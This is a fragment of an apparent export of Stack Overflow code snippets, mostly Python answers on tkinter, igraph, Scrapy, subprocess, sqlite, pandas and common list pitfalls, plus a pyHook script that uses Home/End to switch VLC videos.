</snippet></ROW><ROW><id>20482672</id><snippet>$set(artistsort,%artist%)
$set(albumartistsort,%albumartist%)
</snippet></ROW><ROW><id>20482829</id><snippet>main</snippet></ROW><ROW><id>20482829</id><snippet>hm.KeyDown = kbwrap</snippet></ROW><ROW><id>20482829</id><snippet>kbwrap</snippet></ROW><ROW><id>20482829</id><snippet>kbeventhandler</snippet></ROW><ROW><id>20482829</id><snippet>kbwrap</snippet></ROW><ROW><id>20482829</id><snippet>def kbwrap(event):
    return kbeventhandler(event,flag)
hm.KeyDown = kbwrap
</snippet></ROW><ROW><id>20482829</id><snippet>import os
import sys
import pythoncom, pyHook 
import win32api
import subprocess
import ctypes
import threading
from multiprocessing import *

class vlcThread(threading.Thread):
    def __init__(self,filepath,vlcp,fl):
        threading.Thread.__init__(self)
        self.fn,self.vlcpath,self.flag=filepath,vlcp,fl
        self.daemon=True

        self.start() # invoke the run method

    def run(self):
        vlcinstance=vlc(self.fn,self.vlcpath)
        while True:
            if(self.flag.value==1):
                vlcinstance.play_next()
                self.flag.value=0
            if(self.flag.value==-1):
                vlcinstance.play_prev()
                self.flag.value=0







def kbeventhandler(event,flag):

    if event.Key=='Home':
        flag.value =-1
        return False
    if event.Key=='End':
        flag.value =1
        return False
    return True

class vlc(object):
    def __init__(self,filepath,vlcp):
        self.fn=filepath
        self.vlcpath=vlcp
        self.process = subprocess.Popen([self.vlcpath,self.fn],close_fds=True)
    def kill(self):
        p, self.process = self.process, None
        if p is not None and p.poll() is None:
            p.kill() 
            p.wait()


    def play_next(self):
        self.kill()
        f=self.get_new_file(1)
        self.process = subprocess.Popen([self.vlcpath,f],close_fds=True)
        self.fn=f
    def play_prev(self):
        self.kill()
        f=self.get_new_file(-1)
        self.process = subprocess.Popen([self.vlcpath, f],close_fds=True)
        self.fn=f

    def get_new_file(self,switch):

        dirname= os.path.dirname(self.fn)    
        supplist=['.mkv','.flv','.avi','.mpg','.wmv','ogm','mp4']
        files = [os.path.join(dirname,f) for f in os.listdir(dirname) if (os.path.isfile(os.path.join(dirname,f)) and os.path.splitext(f)[-1]in supplist)]
        files.sort()
        try: currentindex=files.index(self.fn)
        except: currentindex=0
        i=0
        if switch==1:
            if currentindex&lt;(len(files)-1):i=currentindex+1

        else:
            if currentindex&gt;0:i=currentindex-1

        return files[i]    



def main():
    vlcpath='vlc'
    flag=Value('i')
    flag.value=0
    if os.name=='nt': vlcpath='C:/Program Files (x86)/VideoLAN/VLC/vlc.exe'
    fn='H:\\Anime\\needless\\Needless_[E-D]\\[Exiled-Destiny]_Needless_Ep11v2_(04B16479).mkv'
    if len(sys.argv)&gt;1:
        fn=sys.argv[1] #use argument if available or else use default file

    t=vlcThread(fn,vlcpath,flag)
    hm = pyHook.HookManager()
    def kbwrap(event):
        return kbeventhandler(event,flag)
    hm.KeyDown = kbwrap
    hm.HookKeyboard()    
    pythoncom.PumpMessages()


if __name__ == '__main__':
    main() 
</snippet></ROW><ROW><id>20482884</id><snippet>igraph</snippet></ROW><ROW><id>20482884</id><snippet>#!/usr/bin/env python

from igraph import Graph
from itertools import izip

def pairs(l):
    """Given a list l, returns an iterable that yields pairs of the form
    (l[i], l[i+1]) for all possible consecutive pairs of items in l"""
    return izip(l, l[1:])

def convert(g):
    # Get the old vertex names from g
    if "name" in g.vertex_attributes():
        old_names = map(str, g.vs["name"])
    else:
        old_names = map(str, xrange(g.vcount))

    # Get the outdegree vector of the old graph
    outdegs = g.outdegree()

    # Create a mapping from old node IDs to the ID of the first node in
    # the linear subgraph corresponding to the old node in the new graph
    new_node_id = 0
    old_to_new = []
    new_names = []
    for old_node_id in xrange(g.vcount()):
        old_to_new.append(new_node_id)
        new_node_id += outdegs[old_node_id]
        old_name = old_names[old_node_id]
        if outdegs[old_node_id] &lt;= 1:
            new_names.append(old_name)
        else:
            for i in xrange(1, outdegs[old_node_id]+1):
                new_names.append(old_name + "." + str(i))

    # Add a sentinel element to old_to_new just to make our job easier
    old_to_new.append(new_node_id)

    # Create the edge list of the new graph and the weights of the new
    # edges
    new_edgelist = []
    new_weights = []

    # 1) Create the linear subgraphs
    for new_node_id, next_new_node_id in pairs(old_to_new):
        for source, target in pairs(range(new_node_id, next_new_node_id)):
            new_edgelist.append((source, target))
            new_weights.append(0)

    # 2) Create the new edges based on the old ones
    for old_node_id in xrange(g.vcount()):
        new_node_id = old_to_new[old_node_id]
        for edge_id in g.incident(old_node_id, mode="out"):
            neighbor = g.es[edge_id].target
            new_edgelist.append((new_node_id, old_to_new[neighbor]))
            new_node_id += 1
            print g.es[edge_id].source, g.es[edge_id].target, g.es[edge_id]["weight"]
            new_weights.append(g.es[edge_id]["weight"])

    # Return the graph
    vertex_attrs = {"name": new_names}
    edge_attrs = {"weight": new_weights}
    return Graph(new_edgelist, directed=True, vertex_attrs=vertex_attrs, \
            edge_attrs=edge_attrs)
</snippet></ROW><ROW><id>20483086</id><snippet>pack</snippet></ROW><ROW><id>20483086</id><snippet>grid</snippet></ROW><ROW><id>20483086</id><snippet>place</snippet></ROW><ROW><id>20483086</id><snippet>Dashboard</snippet></ROW><ROW><id>20483086</id><snippet>Notepad</snippet></ROW><ROW><id>20483086</id><snippet>Frame</snippet></ROW><ROW><id>20483086</id><snippet>Frame</snippet></ROW><ROW><id>20483086</id><snippet>Frame</snippet></ROW><ROW><id>20483086</id><snippet>Dashboard</snippet></ROW><ROW><id>20483086</id><snippet>Notepad</snippet></ROW><ROW><id>20483086</id><snippet>class Dashboard(ttk.Frame):
    def __init__(self, parent):
        ttk.Frame.__init__(self, parent)  # voodoo
        self.labone = tk.Label(self, text="lab1", fg='black', bg='blue')
        self.labone.grid(row=0, column=0)
        self.grid(row=0, column=0)

    def raiseme(self, event):
        print "raiseme dash"
        self.labone.configure(text=datetime.datetime.now())
        self.lift()

class Notepad(ttk.Frame):
    def __init__(self, parent):
        ttk.Frame.__init__(self, parent)  # also voodoo
        self.laboneone = tk.Label(self, text="lab11", fg='white', bg='red')
        self.laboneone.grid(row=0, column=0)
        self.grid(row=0, column=0)

    def raiseme(self, event):
        print "raiseme notepad"
        self.laboneone.configure(text=datetime.datetime.now())
        self.lift()
</snippet></ROW><ROW><id>20483086</id><snippet>    newFrame = tkinter.Frame(root).grid()
    newFrame_name = tkinter.Label(newFrame, text="This is another frame").grid()
</snippet></ROW><ROW><id>20483086</id><snippet>grid</snippet></ROW><ROW><id>20483086</id><snippet>None</snippet></ROW><ROW><id>20483086</id><snippet>grid</snippet></ROW><ROW><id>20483216</id><snippet>graph = pydot.Dot(graph_type='digraph')
</snippet></ROW><ROW><id>20483283</id><snippet>struct.unpack</snippet></ROW><ROW><id>20483283</id><snippet>&gt;&gt;&gt; a = struct.unpack('f', 'helo')
&gt;&gt;&gt; b = a[0]
&gt;&gt;&gt; b
7.316105495173273e+28
</snippet></ROW><ROW><id>20483283</id><snippet>&gt;&gt;&gt; b, = a
&gt;&gt;&gt; b
7.316105495173273e+28
</snippet></ROW><ROW><id>20483283</id><snippet>&gt;&gt;&gt; for b in a:
...     print(b)
7.316105495173273e+28
</snippet></ROW><ROW><id>20483283</id><snippet>&gt;&gt;&gt; b = struct.unpack('f', 'helo')[0]
&gt;&gt;&gt; b, = struct.unpack('f', 'helo')
&gt;&gt;&gt; c = [b*b for b in struct.unpack('f', 'helo')]
</snippet></ROW><ROW><id>20483350</id><snippet>from scrapy.selector import HtmlXPathSelector
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor

from wallspider.items import Website


class mydomainSpider(CrawlSpider):
    name = "mydomain"
    allowed_domains = ["www.mydomain"]
    start_urls = ["http://www.mydomain/cp/133162",]

    rules = (Rule (SgmlLinkExtractor(allow=('133162', ),deny=('/ip/', 'search_sort=', 'ic=60_0', 'customer_rating', 'special_offers', ),)
    , callback="parse_items", follow= True),
    )

    def parse_items(self, response):
        hxs = HtmlXPathSelector(response)
        sites = hxs.select('//*')
        items = []

        for site in sites:
            item = Website()
            item['referer'] = response.request.headers.get('Referer')
            item['url'] = response.url
            item['title'] = site.xpath('/html/head/title/text()').extract()
            item['description'] = site.select('//meta[@name="Description"]/@content').extract()
            items.append(item)

        return items
</snippet></ROW><ROW><id>20483440</id><snippet>return bundle.obj.customers.filter(id=bundle.request.user.id).exists()</snippet></ROW><ROW><id>20483440</id><snippet>exists</snippet></ROW><ROW><id>20483507</id><snippet>mylist = [[None] * 2] * 2    # Definitely not what you want
</snippet></ROW><ROW><id>20483507</id><snippet>mylist[0].append(1)
</snippet></ROW><ROW><id>20483507</id><snippet>[[None, None, 1], [None, None, 1]]
</snippet></ROW><ROW><id>20483507</id><snippet>mylist = [[None] * 20 for i in range(20)]
</snippet></ROW><ROW><id>20483507</id><snippet>w = World()  # make a world instance
print w.arr  # This should print your 2d list
</snippet></ROW><ROW><id>20483559</id><snippet>buffering</snippet></ROW><ROW><id>20483559</id><snippet>0</snippet></ROW><ROW><id>20483571</id><snippet>pdb.gimp_image_select_contiguous_color</snippet></ROW><ROW><id>20483571</id><snippet>pdb.gimp_context_set_sample_threshold</snippet></ROW><ROW><id>20483658</id><snippet>class Supplier(Person):

    def __init__(self):
        super(Supplier, self).__init__()
</snippet></ROW><ROW><id>20483658</id><snippet>class Model(six.with_metaclass(ModelBase)):
    _deferred = False

    def __init__(self, *args, **kwargs):
</snippet></ROW><ROW><id>20483658</id><snippet>__init__</snippet></ROW><ROW><id>20483658</id><snippet>*args, **kwargs</snippet></ROW><ROW><id>20483658</id><snippet>*args</snippet></ROW><ROW><id>20483658</id><snippet>**kwargs</snippet></ROW><ROW><id>20483660</id><snippet>matches = @obj_list.find { |obj| func_returning_hash(obj.some_method)[@key] == search }

raise "ERROR: No obj found matching search #{search}" if matches.nil?
results &lt;&lt; matches.map { |obj| func_creating_result(obj) }
</snippet></ROW><ROW><id>20483765</id><snippet>from collections import deque
from itertools import cycle

try:
    xrange 
except NameError: # python3
    xrange = range

def pack(d):
    tup = tuple(d)
    return zip(cycle(tup[0:1]), tup[1:])

def window(seq, n=2):
    it = iter(seq)
    d = deque((next(it, None) for _ in xrange(n)), maxlen=n)
    yield pack(d)
    for e in it:
        d.append(e)
        yield pack(d)
</snippet></ROW><ROW><id>20483765</id><snippet>&gt;&gt;&gt; for l in window([1,2,3,4,5], 4):
...     for l1, l2 in l:
...         print l1, l2
...
1 2
1 3
1 4
2 3
2 4
2 5
</snippet></ROW><ROW><id>20483765</id><snippet>window(open('C:/working_file.txt', mode='r', encoding='utf8'), 4)
</snippet></ROW><ROW><id>20483945</id><snippet>&gt;&gt;&gt; import re

&gt;&gt;&gt; string = "string.isnotimportant"
#I explain a bit about this at the end
&gt;&gt;&gt; regex = '\w*(\W+)\w*' # the brackets in the regex mean that item, if matched will be stored as a group
#in order to understand the re module properly, I think your best bet is to read some docs, I will link you at the end of the post
&gt;&gt;&gt; x = re.search(regex, string)

&gt;&gt;&gt; x.groups() #remember the stored group above? well this accesses that group.
               #if there were more than one group above, there would be more items in the tuple
('.',)

#here I reassign the variable string to a modified version where the '.' is replaced with ''(nothing).
&gt;&gt;&gt; string = string.replace('.', '')
&gt;&gt;&gt; string += x.groups()[0] # here I basically append a letter to the end of string
</snippet></ROW><ROW><id>20483945</id><snippet>+=</snippet></ROW><ROW><id>20483945</id><snippet>x.groups()[0]</snippet></ROW><ROW><id>20483945</id><snippet>&gt;&gt;&gt; print string

"stringisnotimportant."
</snippet></ROW><ROW><id>20483957</id><snippet>&gt;&gt;&gt; [[None for x in range(20)] for y in range(20)]
[[None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None], [None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None, None]]
</snippet></ROW><ROW><id>20483957</id><snippet>AttackRobot</snippet></ROW><ROW><id>20483957</id><snippet>TypeError: __init__() takes exactly 5 arguments (1 given)
</snippet></ROW><ROW><id>20483957</id><snippet>team</snippet></ROW><ROW><id>20483957</id><snippet>x</snippet></ROW><ROW><id>20483957</id><snippet>y</snippet></ROW><ROW><id>20483957</id><snippet>direction</snippet></ROW><ROW><id>20483957</id><snippet>self</snippet></ROW><ROW><id>20483957</id><snippet>self.arr[x][y] = AttackRobot(team, x, y, direction)
</snippet></ROW><ROW><id>20483984</id><snippet>def __init__(self, xISBN, xTitle, xpageCount, xpublishDate, xAuthor):
    self.ISBN = xISBN
    self.Title = xTitle
    self.pageCount = xpageCount
    self.publishDate = xpublishDate
    self.Author = xAuthor

def printBook(self):
    print('ISBN -',self.ISBN)
    print('Title -',self.Title)
    print('Page Count -',self.pageCount)
    print('Published Date -',self.publishDate)
    print('Author -',self.Author)
</snippet></ROW><ROW><id>20483984</id><snippet>book = Book("isbn","Harry Potter", 500, "12/12/12", "J.K. Rowling ")</snippet></ROW><ROW><id>20483984</id><snippet>book.printBook()</snippet></ROW><ROW><id>20484030</id><snippet>for index, line in enumerate(original)</snippet></ROW><ROW><id>20484030</id><snippet>line</snippet></ROW><ROW><id>20484030</id><snippet>original[0]</snippet></ROW><ROW><id>20484030</id><snippet>if</snippet></ROW><ROW><id>20484052</id><snippet>subprocess</snippet></ROW><ROW><id>20484052</id><snippet>os.system</snippet></ROW><ROW><id>20484052</id><snippet>subprocess</snippet></ROW><ROW><id>20484052</id><snippet>subprocess</snippet></ROW><ROW><id>20484052</id><snippet>p = subprocess.Popen(['lib/the_executable'])
</snippet></ROW><ROW><id>20484052</id><snippet>lib</snippet></ROW><ROW><id>20484052</id><snippet>lib</snippet></ROW><ROW><id>20484052</id><snippet>scriptdir = os.path.abspath(os.path.dirname(__file__))
</snippet></ROW><ROW><id>20484052</id><snippet>path = os.path.join(scriptdir, 'lib/the_executable')
p = subprocess.Popen([path])
</snippet></ROW><ROW><id>20484052</id><snippet>Popen</snippet></ROW><ROW><id>20484052</id><snippet>p</snippet></ROW><ROW><id>20484052</id><snippet>poll</snippet></ROW><ROW><id>20484052</id><snippet>wait</snippet></ROW><ROW><id>20484052</id><snippet>kill</snippet></ROW><ROW><id>20484052</id><snippet>Popen</snippet></ROW><ROW><id>20484052</id><snippet>xterm</snippet></ROW><ROW><id>20484052</id><snippet>display.init</snippet></ROW><ROW><id>20484052</id><snippet>Popen</snippet></ROW><ROW><id>20484052</id><snippet>env</snippet></ROW><ROW><id>20484052</id><snippet>None</snippet></ROW><ROW><id>20484052</id><snippet>child_env = dict(os.environ)
child_env['SDL_WINDOWID'] = the_window_id
p = subprocess.Popen([path], env=child_env)
</snippet></ROW><ROW><id>20484052</id><snippet>-into</snippet></ROW><ROW><id>20484052</id><snippet>SDL_VIDEO_WINDOW_POS</snippet></ROW><ROW><id>20484052</id><snippet>child_env = dict(os.environ)
child_env['SDL_WINDOWID'] = the_window_id
child_env['SDL_VIDEO_WINDOW_POS'] = '{},{}'.format(left, top)
p = subprocess.Popen([path, width, height], env=child_env)
</snippet></ROW><ROW><id>20484052</id><snippet>width, height = sys.argv[1:3]
pygame.display.init()
pygame.display.set_mode((width, height), pygame.NOFRAME)
</snippet></ROW><ROW><id>20484052</id><snippet>ctypes</snippet></ROW><ROW><id>20484052</id><snippet>python-xlib</snippet></ROW><ROW><id>20484081</id><snippet>execvpe</snippet></ROW><ROW><id>20484081</id><snippet>perl /home/josh/scripts/deluge/sorttv.pl</snippet></ROW><ROW><id>20484081</id><snippet>'perl /home/josh/scripts/deluge/sorttv.pl' ...
</snippet></ROW><ROW><id>20484081</id><snippet>/home/josh/scripts/deluge/sorttv.pl</snippet></ROW><ROW><id>20484081</id><snippet>args = (...)
os.execvpe('perl /home/josh/scripts/deluge/sorttv.pl', args, env)
</snippet></ROW><ROW><id>20484081</id><snippet>args = ('/home/josh/scripts/deluge/sorttv.pl', ...)
os.execvpe('perl', args, env)
</snippet></ROW><ROW><id>20484095</id><snippet>import sys
print ( sys.path )
</snippet></ROW><ROW><id>20484095</id><snippet>sklearn</snippet></ROW><ROW><id>20484095</id><snippet>.../project/src/sklearn</snippet></ROW><ROW><id>20484095</id><snippet>sklearn</snippet></ROW><ROW><id>20484095</id><snippet>svm</snippet></ROW><ROW><id>20484110</id><snippet>from module import *
</snippet></ROW><ROW><id>20484129</id><snippet>def parse_start_url(self, response):
    list(self.parse_links(response))

def parse_links(self, response):
    hxs = HtmlXPathSelector(response)
    links = hxs.select('//a')
    for link in links:
        anchor_text = ''.join(link.select('./text()').extract())
        meta={'anchor_text':anchor_text,}
        ...
        yield Request(url, callback = self.parse_items, meta=meta,)

def parse_items(self, response):
    item['anchor_text']=response.meta['anchor_text']
    yield items ...
</snippet></ROW><ROW><id>20484205</id><snippet>range</snippet></ROW><ROW><id>20484205</id><snippet>allocations = list(range(len(people)))
</snippet></ROW><ROW><id>20484301</id><snippet>d['feline']['cat'] = 55
</snippet></ROW><ROW><id>20484301</id><snippet>d['feline'][fp] = int(apa)
</snippet></ROW><ROW><id>20484301</id><snippet>d['feline'] = {fp : int(apa)}
</snippet></ROW><ROW><id>20484301</id><snippet>d['feline']</snippet></ROW><ROW><id>20484301</id><snippet>{fp : int(apa)}</snippet></ROW><ROW><id>20484325</id><snippet>randfunc</snippet></ROW><ROW><id>20484325</id><snippet>from Crypto.Protocol.KDF import PBKDF2
from Crypto.PublicKey import RSA

password = "swordfish"   # for testing
salt = "yourAppName"     # replace with random salt if you can store one

master_key = PBKDF2(password, salt, count=10000)  # bigger count = better

def my_rand(n):
    # kluge: use PBKDF2 with count=1 and incrementing salt as deterministic PRNG
    my_rand.counter += 1
    return PBKDF2(master_key, "my_rand:%d" % my_rand.counter, dkLen=n, count=1)

my_rand.counter = 0
RSA_key = RSA.generate(2048, randfunc=my_rand)
</snippet></ROW><ROW><id>20484325</id><snippet>abc123</snippet></ROW><ROW><id>20484420</id><snippet>database.db</snippet></ROW><ROW><id>20484420</id><snippet>commit</snippet></ROW><ROW><id>20484420</id><snippet>INSERT</snippet></ROW><ROW><id>20484420</id><snippet>execute</snippet></ROW><ROW><id>20484420</id><snippet>INSERT</snippet></ROW><ROW><id>20484420</id><snippet>try</snippet></ROW><ROW><id>20484420</id><snippet>except</snippet></ROW><ROW><id>20484420</id><snippet>logging</snippet></ROW><ROW><id>20484420</id><snippet>open</snippet></ROW><ROW><id>20484420</id><snippet>write</snippet></ROW><ROW><id>20484420</id><snippet>print</snippet></ROW><ROW><id>20484420</id><snippet>def insertdb(unique_id,number_of_days):
        conn = sqlite3.connect('database.db')
        print "Opened database successfully";
        try:
            conn.execute("INSERT INTO IDENT (ID_NUM,DAYS_LEFT) VALUES (?,?)",(unique_id,number_of_days));
            conn.commit()
            print "Records created successfully";
        except Exception as e:
            print e # or, better, traceback.print_exc()
        conn.close()
</snippet></ROW><ROW><id>20484433</id><snippet>curses</snippet></ROW><ROW><id>20484433</id><snippet>curses.initscr()</snippet></ROW><ROW><id>20484433</id><snippet>WindowObject</snippet></ROW><ROW><id>20484433</id><snippet>curses.initscr()</snippet></ROW><ROW><id>20484433</id><snippet>WindowObject</snippet></ROW><ROW><id>20484433</id><snippet>start_color()</snippet></ROW><ROW><id>20484433</id><snippet>curses</snippet></ROW><ROW><id>20484433</id><snippet>curses.start_color()
</snippet></ROW><ROW><id>20484597</id><snippet>[any mutable objects] * 2
</snippet></ROW><ROW><id>20484597</id><snippet>[[x] for x in range(5)]*2
</snippet></ROW><ROW><id>20484597</id><snippet>[[x] for _ in range(2) for x in range(5)]
</snippet></ROW><ROW><id>20484597</id><snippet>deepcopy</snippet></ROW><ROW><id>20484597</id><snippet>copy.deepcopy([[x] for x in range(5)]*2)
</snippet></ROW><ROW><id>20484597</id><snippet>deepcopy</snippet></ROW><ROW><id>20484597</id><snippet>&gt;&gt;&gt; a = [[x] for x in range(5)]
&gt;&gt;&gt; b = [copy.deepcopy(a), copy.deepcopy(a)]
&gt;&gt;&gt; # or [copy.deepcopy(a) for _ in range(2)]
&gt;&gt;&gt; b[0] is b[1]
False
&gt;&gt;&gt; b[0][0] is b[1][0]
False
</snippet></ROW><ROW><id>20484597</id><snippet>&gt;&gt;&gt; b = [copy.deepcopy(x) for x in a*2]
&gt;&gt;&gt; b[0][0] is b[1][0]
False
</snippet></ROW><ROW><id>20484668</id><snippet>def left90(self):
    self.direction = left_dict[self.direction]
</snippet></ROW><ROW><id>20484782</id><snippet>Lval</snippet></ROW><ROW><id>20484782</id><snippet>g</snippet></ROW><ROW><id>20484782</id><snippet>last, lastG = 0, 0
for g in num:
  Lval,x = quad(L, lastG, g)
  last, lastG = last + Lval, g
  Lv=np.append(Lv,[last])
</snippet></ROW><ROW><id>20484782</id><snippet>Lv = []
last, lastG = 0, 0
for g in num:
  Lval,x = quad(L, lastG, g)
  last, lastG = last + Lval, g
  Lv.append(last)
Lv = np.array(Lv)
</snippet></ROW><ROW><id>20484818</id><snippet>create_engine('mysql+mysqldb://HOSTNAME/DATABASE?charset=utf8')
</snippet></ROW><ROW><id>20484818</id><snippet>create_engine('mysql+mysqldb://HOSTNAME/DATABASE')
</snippet></ROW><ROW><id>20484864</id><snippet>In [72]: str.replace('one','o','1')
Out[72]: '1ne'
</snippet></ROW><ROW><id>20484864</id><snippet>In [73]: 'one'.replace('o','1')
Out[73]: '1ne'
</snippet></ROW><ROW><id>20484864</id><snippet>   if binary == "-1":
      senti = senti.strip('"').replace("-1","negative")
</snippet></ROW><ROW><id>20484864</id><snippet>f = open("data#2.txt","r")
for line1 in f.readlines()[1:]: # skip the first line
   #rest of your code here
</snippet></ROW><ROW><id>20484864</id><snippet>f = open("data#2.txt","r")
datalines = f.readlines()[1:]

count = 0

for line in sys.stdin:
    if count == len(datalines): break # kill the loop if we've reached the end
    (tweetid,num,senti,tweets) = re.split("\t+",line.strip())
    tweet = re.split("\s+", tweets.strip().lower())
    # grab the right index from our list
    (binary,rest,rest1,test2) = re.split("\s", datalines[count].strip())
    if binary == "-1":
        sentiment = "negative"
    elif binary == "1":
        sentiment = "positive"
    elif binary == "0":
        sentiment = "neutral"
    print tweetid, "\t", num, "\t", sentiment, "\t", tweets
    count += 1 # add to our counter
</snippet></ROW><ROW><id>20484960</id><snippet>beautifulsoup.</snippet></ROW><ROW><id>20484960</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; a='&lt;p&gt;dhhdhd&lt;p&gt;dhdhd&lt;/p&gt;'
&gt;&gt;&gt; re.sub('&lt;p&gt;|&lt;/p&gt;','',a)
'dhhdhddhdhd'
</snippet></ROW><ROW><id>20484960</id><snippet>re.sub('&lt;p[^&gt;]*&gt;|&lt;/p&gt;','',a)
</snippet></ROW><ROW><id>20484976</id><snippet># straightforward but deep
def is_full(self):
    for row in self.data:
        for cell in row:
            if cell == ' ':
                return False
    return True
</snippet></ROW><ROW><id>20484976</id><snippet># combine the last two
def is_full(self):  # python functions/methods are usually lower case
    for row in self.data:  # no need to index everything like c
        if any(cell == ' ' for cell in row):  # any/all are convenient testers
            return False  # if you find even one, it's done.
    return True  # if you couldn't disqualify it, then it looks full
</snippet></ROW><ROW><id>20484976</id><snippet># one line, not especially readable
def is_full(self):
    return not any(cell == ' ' for row in d for cell in row)
</snippet></ROW><ROW><id>20485203</id><snippet>r1</snippet></ROW><ROW><id>20485203</id><snippet>r2</snippet></ROW><ROW><id>20485203</id><snippet>.left, .right, .top, and .bottom</snippet></ROW><ROW><id>20485203</id><snippet>left = max(r1.left, r2.left);
right = min(r1.right, r2.right);
top = max(r1.top, r2.top);
bottom = max(r1.bottom, r2.bottom);
</snippet></ROW><ROW><id>20485203</id><snippet>Area = (right - left) * (top - bottom);
</snippet></ROW><ROW><id>20485203</id><snippet>clip()</snippet></ROW><ROW><id>20485233</id><snippet>rasterized</snippet></ROW><ROW><id>20485233</id><snippet>pts = np.random.rand(2, 100000)
plt.scatter(*pts, rasterized=True)
plt.savefig('rast.pdf')
</snippet></ROW><ROW><id>20485233</id><snippet>plt.scatter(*pts)
plt.savefig('reg.pdf')
</snippet></ROW><ROW><id>20485233</id><snippet>$ ls -lh tmp*.pdf
177K Dec  9 22:03 tmp_rast.pdf
1.5M Dec  9 22:02 tmp_reg.pdf
</snippet></ROW><ROW><id>20485267</id><snippet>import json
import urllib2

search_line = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&amp;q=hello'
response = urllib2.urlopen(search_line)
search_results = json.loads(response.read())
print(search_results['responseData']['results'])
</snippet></ROW><ROW><id>20485338</id><snippet>pivot_table</snippet></ROW><ROW><id>20485338</id><snippet>aggfunc</snippet></ROW><ROW><id>20485338</id><snippet>&gt;&gt;&gt; pd.pivot_table(df, values=['D', 'E'], rows=['B'], aggfunc=[np.mean, np.sum])
       mean                 sum          
          D         E         D         E
B                                        
A -0.102403  0.854174 -0.819224  6.833389
B  0.426928 -0.177344  3.415428 -1.418754
C -0.159123 -0.071418 -1.272980 -0.571341

[3 rows x 4 columns]
</snippet></ROW><ROW><id>20485338</id><snippet>df.pivot_table(stuff)</snippet></ROW><ROW><id>20485375</id><snippet>conn.commit()</snippet></ROW><ROW><id>20485463</id><snippet>top</snippet></ROW><ROW><id>20485467</id><snippet>dct = {}
with open('input', 'r') as f:
    for line in f:
        name, value = line.split()
        key, name = name.split('_')
        lst = dct.get(key ,[])
        lst.extend([name, value])
        dct[key] = lst


with open('result', 'w') as f:
    for k, v in dct.items():
        f.write(k+" " + (" ".join(v))+"\n")
</snippet></ROW><ROW><id>20485554</id><snippet>Element</snippet></ROW><ROW><id>20485554</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; np.__version__
'1.7.1'
&gt;&gt;&gt; p = np.array([1,2,3])
&gt;&gt;&gt; class Foo:
...     pass
... 
&gt;&gt;&gt; p[0] = Foo()
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
SystemError: error return without exception set
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>20485554</id><snippet>object</snippet></ROW><ROW><id>20485554</id><snippet>    periodicTable = np.array(range(7*32)).reshape((7,32))
</snippet></ROW><ROW><id>20485554</id><snippet>    periodicTable = np.empty((7,32), dtype=object)
</snippet></ROW><ROW><id>20485818</id><snippet>for</snippet></ROW><ROW><id>20485818</id><snippet>var myarray = ["a","b","c"]
for(var i = 0; i &lt; myarray.length; i++){
  console.log(i, myarray[i])
}
</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>var myobject = {
    foo: "bar",
    baz: "buz"
}

for (var p in myobject) {
    console.log(p, myobject[p]);
}
</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>for-in</snippet></ROW><ROW><id>20485818</id><snippet>.forEach()</snippet></ROW><ROW><id>20485818</id><snippet>myarray.forEach(function(item, i) {
    console.log(item, i);
});
</snippet></ROW><ROW><id>20485823</id><snippet>&gt;&gt;&gt; print "%-10s %-3s %-10s" % ('foo', 2, 'bar')
foo        2   bar
</snippet></ROW><ROW><id>20485823</id><snippet>&gt;&gt;&gt; print "%-*s %-*s %-*s" % (10, 'foo', 3, 2, 10, 'bar')
foo        2   bar
</snippet></ROW><ROW><id>20486134</id><snippet>':'</snippet></ROW><ROW><id>20486134</id><snippet>original.split(':')[1]
</snippet></ROW><ROW><id>20486134</id><snippet>&gt;&gt;&gt; original = "user1224 : Bob Realname"
&gt;&gt;&gt; original.split(':')[1]
' Bob Realname'
&gt;&gt;&gt; original.split(':')[1].strip()  # remove leading whitespace.
'Bob Realname'
</snippet></ROW><ROW><id>20486554</id><snippet>__init__.py</snippet></ROW><ROW><id>20486554</id><snippet>$ mkdir foo
$ touch foo/__init__.py
</snippet></ROW><ROW><id>20486554</id><snippet>sys.path</snippet></ROW><ROW><id>20486581</id><snippet>from tkinter import *
root = Tk()

class StopWatch(Frame):
    def __init__(self, parent=None, **kw):
        Frame.__init__(self, parent, kw)
        self.on = 1
        TimeAdjustLabel = LabelFrame(root, text='Frame',)
        TimeAdjustLabel.grid(column=0, row=1, padx=10, pady=10)
